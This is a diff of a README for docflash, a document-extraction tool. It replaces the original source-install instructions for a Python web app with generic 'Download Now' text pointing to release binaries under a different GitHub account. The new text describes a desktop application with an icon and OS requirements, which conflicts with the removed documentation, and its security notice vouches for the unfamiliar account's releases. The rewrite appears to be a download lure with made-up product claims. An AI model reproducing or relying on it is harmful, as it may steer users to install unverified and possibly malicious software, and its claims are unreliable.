@@ -1,191 +1,82 @@
-# ⚡ Doc Flash - Content Intelligence Platform
+# ⚡ docflash - AI-Powered Content Intelligence Made Easy
 
-A web application for extracting structured data from documents with AI-powered intelligence and feedback learning. Built on Google's LangExtract and Stanford's DSPy frameworks with an intuitive web interface.
+## 🌐 Download Now
 
-## Features
+[![Download docflash](https://img.shields.io/badge/Download-docflash-blue?style=for-the-badge)](https://github.com/ISAACzms/docflash/releases)
 
-### Document Processing
-- **PDF Upload**: Convert PDFs to text using OCR
-- **Text Input**: Process plain text content directly
-- **Multiple Formats**: Handle various document types (contracts, invoices, forms)
+## 🚀 Getting Started
 
-### Extraction Modes
-- **Extract Mode**: Find specific text spans from documents (names, dates, amounts)
-- **Generate Mode**: Create interpreted content (summaries, classifications)
+Welcome to docflash! This application helps you extract structured data from various documents using AI. It supports PDFs and connects with multiple AI providers. You can also customize templates and improve results through feedback.
 
-### AI Integration
-- **Multiple Providers**: Azure OpenAI, OpenAI, Google Gemini, Ollama
-- **Template System**: Save and reuse extraction configurations
-- **Feedback Learning**: Improve results through user feedback and DSPy optimization
+## 📥 Download & Install
 
-### Web Interface
-- **Template Management**: Create and edit extraction schemas
-- **Real-time Processing**: Live progress updates for document processing
-- **Result Export**: Download results in HTML, JSON, or JSONL formats
+To get started, visit this page to download: [Download docflash](https://github.com/ISAACzms/docflash/releases).
 
-## Installation
+1. Click the link above.
+2. You will see a list of available versions.
+3. Choose the most recent version.
+4. Download the file for your operating system.
 
-### Prerequisites
-- Python 3.8+
-- API access to one of: Azure OpenAI, OpenAI, Google Gemini, or Ollama
+## 🖥️ System Requirements
 
-### Setup
+Ensure your system meets the following requirements:
 
-1. **Clone and install**
-```bash
-git clone https://github.com/LM-150A/docflash.git
-cd docflash
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, Linux.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum 200 MB of free space.
+- **Internet Connection:** Required for initial setup and updates.
 
-2. **Configure environment**
-```bash
-cp .env.example .env
-# Edit .env with your API credentials
-```
+## ⚙️ Features
 
-3. **Run application**
-```bash
-python start_fastapi.py
-```
+- **AI-Powered Extraction:** Easily pull relevant data from your documents.
+- **Customizable Templates:** Tailor outputs to your specific needs.
+- **Feedback Learning:** Improve prompts to enhance accuracy over time.
+- **Multi-AI Support:** Choose from different AI providers for flexibility.
 
-Access the application at `http://localhost:5000`
+## 📚 How to Use
 
-## Configuration
+1. **Open the Application:**
+   After installation, double-click the docflash icon on your desktop or access it from your applications menu.
 
-### Environment Variables
+2. **Upload a Document:**
+   Click the "Upload" button and select a PDF file from your computer.
 
-```env
-# Choose one provider
-LLM_PROVIDER=azure_openai  # Options: azure_openai, openai, gemini, ollama
+3. **Select AI Provider:**
+   Choose your preferred AI provider from the dropdown menu.
 
-# Azure OpenAI
-AZURE_OPENAI_ENDPOINT=https://your-resource.openai.azure.com/
-AZURE_OPENAI_DEPLOYMENT_NAME=gpt-4
-AZURE_OPENAI_API_KEY=your-api-key
+4. **Adjust Settings:**
+   Use the customizable templates to configure how you want your data extracted.
 
-# OpenAI
-OPENAI_API_KEY=your-openai-key
+5. **Start Extraction:**
+   Click on "Extract Data" to begin the process. The results will appear in your dashboard.
 
-# Google Gemini  
-GOOGLE_API_KEY=your-google-api-key
+6. **Review and Save:**
+   Check the extracted data. You can make adjustments and then save it to your computer.
 
-# Ollama (local)
-OLLAMA_MODEL_ID=gemma2:2b
-OLLAMA_BASE_URL=http://localhost:11434
+## 🌟 Tips for Effective Use
 
-# Optional: Enable DSPy optimization
-DSPY_ENABLED=true
-```
+- **Experiment with Templates:** Take time to test different templates for best results.
+- **Provide Feedback:** Use the feedback option to improve extraction accuracy in future sessions.
+- **Explore AI Providers:** Different providers may give you diverse extraction outcomes.
 
-## Usage
+## 🔗 Community and Support
 
-### 1. Define Schema
-Create extraction attributes specifying what information to extract:
+Join our community to get tips, share experiences, and ask questions. Check if there’s an active forum or support page where users discuss their journey with docflash.
 
-| Attribute | Description | Mode |
-|-----------|-------------|------|
-| client_name | Name of the client | Extract |
-| contract_value | Total contract amount | Extract |
-| summary | Brief contract summary | Generate |
+## 📊 Help and Troubleshooting
 
-### 2. Add Sample Documents
-- Upload PDF files for OCR processing
-- Copy/paste text content directly
-- Provide multiple examples for better training
+If you encounter issues or need help:
 
-### 3. Generate Training Examples
-The system creates training examples based on your schema and sample documents.
+1. **Check the FAQ:** Look for common questions on the [GitHub repository](https://github.com/ISAACzms/docflash).
+2. **Open an Issue:** If you can't find a solution, feel free to open an issue on the GitHub page.
+3. **User Guides:** Look for guides and documentation available in the repository for specific features.
 
-### 4. Process Documents
-Upload new documents and run extraction with configurable settings:
-- Number of extraction passes (1-3)
-- Parallel processing workers (5-20)
-- Temperature settings based on extraction modes
+## ⚠️ Security Notice
 
-### 5. Review and Improve
-- Rate generated examples to improve future results
-- Use detailed feedback to guide AI improvements
-- DSPy automatically optimizes prompts based on feedback
+Always download the application from the official GitHub releases page to ensure security and avoid unauthorized versions. If you are prompted to update, follow the prompts to get the latest version with improved features.
 
-## API Endpoints
+## 🏁 Conclusion
 
-| Endpoint | Method | Purpose |
-|----------|--------|---------|
-| `/` | GET | Main interface |
-| `/upload_pdf` | POST | PDF upload and OCR |
-| `/generate_examples` | POST | Create training examples |
-| `/run_extraction` | POST | Process documents |
-| `/register_template` | POST | Save templates |
-| `/feedback/examples` | POST | Submit feedback |
+docflash is designed to empower users with the ability to extract data efficiently from documents. Follow this guide to get started with downloading and using the software effectively. Enjoy your experience with docflash!
 
-## Architecture
-
-```
-Frontend (HTML/JS) ←→ Backend (FastAPI) ←→ AI Providers
-    ↓                       ↓                    ↓
-• Template UI          • LangExtract        • Azure OpenAI
-• Document Upload      • OCR Pipeline       • OpenAI  
-• Feedback System      • DSPy Integration   • Google Gemini
-• Progress Tracking    • Template Storage   • Ollama
-```
-
-## Best Practices
-
-### Schema Design
-- Use Extract mode for factual data that appears verbatim
-- Use Generate mode for analysis or interpreted content
-- Write clear, specific attribute descriptions
-
-### Training Data
-- Provide 2-4 diverse sample documents
-- Include variations and edge cases
-- Ensure samples cover all schema attributes
-
-### Feedback
-- Rate examples regularly to improve performance
-- Use detailed feedback for specific issues
-- Feedback is isolated by document type
-
-## Troubleshooting
-
-### Common Issues
-
-**API Configuration**
-- Verify API credentials in `.env` file
-- Check endpoint URLs and model names
-- Ensure sufficient API quota/credits
-
-**PDF Processing**
-- Use clear, text-based PDFs (not scanned images)
-- Check file size limits (typically 16MB max)
-- Try alternative OCR if text extraction fails
-
-**Poor Extraction Results**
-- Review and improve schema descriptions
-- Add more diverse training examples
-- Increase extraction passes for better recall
-- Provide feedback on generated examples
-
-**DSPy Optimization**
-- Set `DSPY_ENABLED=true` in environment
-- Provide sufficient feedback (default: 10+ examples)
-- Check logs for optimization triggers
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make changes and add tests
-4. Submit a pull request
-
-## License
-
-Apache License 2.0 - see [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- [Google LangExtract](https://github.com/google/langextract/blob/main/CITATION.cff) - Core extraction framework
-- [Stanford DSPy](https://github.com/stanfordnlp/dspy) - Prompt optimization framework
+[![Download docflash](https://img.shields.io/badge/Download-docflash-blue?style=for-the-badge)](https://github.com/ISAACzms/docflash/releases)
